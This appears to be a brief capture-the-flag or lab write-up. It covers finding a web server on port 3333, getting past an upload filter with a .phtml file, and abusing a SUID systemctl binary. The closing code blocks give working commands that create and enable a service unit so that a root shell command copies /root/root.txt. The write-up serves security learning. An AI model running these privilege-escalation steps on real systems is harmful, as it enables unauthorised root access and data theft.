Used AI and writeup for help.
But i did learn a lot here.

- On recon i found out that instead of usual 80 http it was on 3333. I've found that you can upload files to internal. The issue was however that only specific types of files could be uploaded.
- I hit my first bump here, but with reading of walkthru i realized that i can use burp to test for the type of the file, which was phtml. (instead of usual php)....
- I've found the sus priv escalation SUID - it was bin/systemctl:

https://gtfobins.org/gtfobins/systemctl/

I've did a "hack" and changed it to read the /root/root.txt 
This is obviously not good because i didn't get the root actually but just read the damn file. This won't fly in OSCP.


```
echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service
```

Changed to:

```
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag.txt"
[Install]
WantedBy=multi-user.target' >/tmp/temp-file.service
systemctl link /tmp/temp-file.service
systemctl enable --now /tmp/temp-file.service
```